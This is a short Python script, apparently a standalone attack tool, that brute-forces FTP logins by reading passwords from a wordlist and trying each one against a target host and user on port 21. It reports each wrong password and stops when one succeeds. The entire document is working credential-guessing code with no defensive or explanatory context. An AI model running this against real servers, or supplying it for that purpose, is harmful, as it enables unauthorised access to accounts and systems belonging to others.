import ftplib
port = 21
def start(host,user,wd):
	server = ftplib.FTP()
	try:
		word=open(wd,'r')
		pass_c=len(list(open(wd, "rb")))
	except:
		raise FileNotFoundError('Wordlist Not Found!')
	c=0
	while True:
		word_p=word.readline()
		word_p=word_p.strip()
		c=c+1
		if c-1==pass_c:
			print('\n[!] Password Not in Wordlist!')
			break
		try:
			server.connect(host, port, timeout=5)
			server.login(user, word_p)
			print('[*] Password Found : '+word_p)
			break
		except:
			print('[*] Wrong Password : ',word_p)	